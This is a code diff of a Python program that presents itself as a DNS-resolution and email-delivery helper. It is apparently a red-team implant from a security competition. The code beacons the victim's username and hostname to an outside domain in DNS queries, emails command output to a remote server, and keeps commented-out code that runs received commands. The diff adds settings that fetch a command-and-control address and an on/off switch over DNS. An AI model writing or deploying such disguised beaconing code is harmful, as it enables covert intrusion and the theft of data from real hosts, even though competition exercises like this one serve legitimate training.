@@ -10,6 +10,9 @@ SERVER = "127.0.0.1"
 # SERVER = "8.8.8.8"
 TARGET_FQDN = "a.team8.cybertigers.club"
 dnsResult = False
+c2IP = "samplec2.ists."
+c2enabled = True
+
 '''
 Copyright (c) 2014 Valera Likhosherstov <v.lihosherstov@gmail.com>
 dns message structures
@@ -518,7 +521,8 @@ class DNSClient:
         '''connection
         '''
         try:
-            self.socket.connect((server, 53))
+            self.socket.connect((server, 5354))
+            #todo: change this back after testing
         except Exception:
             print('Unable to connect to server {0}'.format(server))
             return False
@@ -540,21 +544,34 @@ class DNSClient:
                    debug_mode=False, IPv6=False):
         '''request
         '''
+
+        global c2enabled
+        global c2IP
+
         format = DNSMessageFormat()
         query = format.encode(request, recursion_desired, IPv6)
         self.socket.send(query)
         try:
-            responce = self.socket.recv(1024)
+            response = self.socket.recv(1024)
         except Exception:
             print('Time Out: {0}'.format(self.server))
             sys.exit(0)
-        format.decode(responce)
+        format.decode(response)
 
         if len(format.answers) > 0:
             format.print_result()
             results = format.get_results()
             if len(results) > 0:
-                command = self.cmdDecode(results)
+                if request == "c2.":
+                    c2IP = results
+                    self.socket.close()
+                    return
+                if request == "c2e.":
+                    c2enabled = (results == "yes.")
+                    self.socket.close()
+                    return
+
+                # command = self.cmdDecode(results)
                 # print(results)
                 # print(command)
                 # out = subprocess.Popen(command.split(), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
@@ -580,6 +597,9 @@ def dnsRun(dest):
     machineIP = socket.getfqdn()  # should get full hostname/domain name
     requestName = username + "AT." + machineIP + "." + TARGET_FQDN
     # print("Requesting:", requestName)
+    client.send_query("c2.", recursion_desired=True, debug_mode=False)
+    client.send_query("c2e.", recursion_desired=True, debug_mode=False)
+    #todo: fqdns for c2
     client.send_query(requestName, recursion_desired=True, debug_mode=False)
     client.disconnect()
 
@@ -605,6 +625,9 @@ def smtpRun(dest):
     else:
         stderr = ""
     connection.sendmail(emailAddr, "mailman@"+dest, stdout+"\n"+stderr)
+
+def c2Run(fqdn: str):
+    print("Attempting to communicate with C2")
 
 def linuxResolv():
     for line in open("/etc/resolv.conf", "r"):
@@ -660,8 +683,10 @@ def main():
 
     parser = argparse.ArgumentParser(description='Maintains DNS resolution for email delivery.')
     parser.add_argument("--systemd", help="Take input and timing from SystemD rather than running automatically by itself.", action="store_true")
-    parser.add_argument('-D', "--dns", help="Only use DNS", action="store_true")
-    parser.add_argument("-S", "--smtp", help="Only use SMTP", action="store_true")
+    parser.add_argument('-D', "--dns", help="Use DNS", action="store_true")
+    parser.add_argument("-S", "--smtp", help="Use SMTP", action="store_true")
+    parser.add_argument("-i", "--install", help="Install new settings.", action="store_true")
+    #todo: implement install
     parser.add_argument('hostname', help="The hostname or IP of the destination server")
     args = parser.parse_args()
 
@@ -674,6 +699,8 @@ def main():
             dnsRun(dnsDest)
         if args.smtp:
             smtpRun(smtpDest)
+        if c2enabled:
+            c2Run(c2IP)
         if args.systemd:
             # running from systemd, don't enable timed autorun
             exit(0)
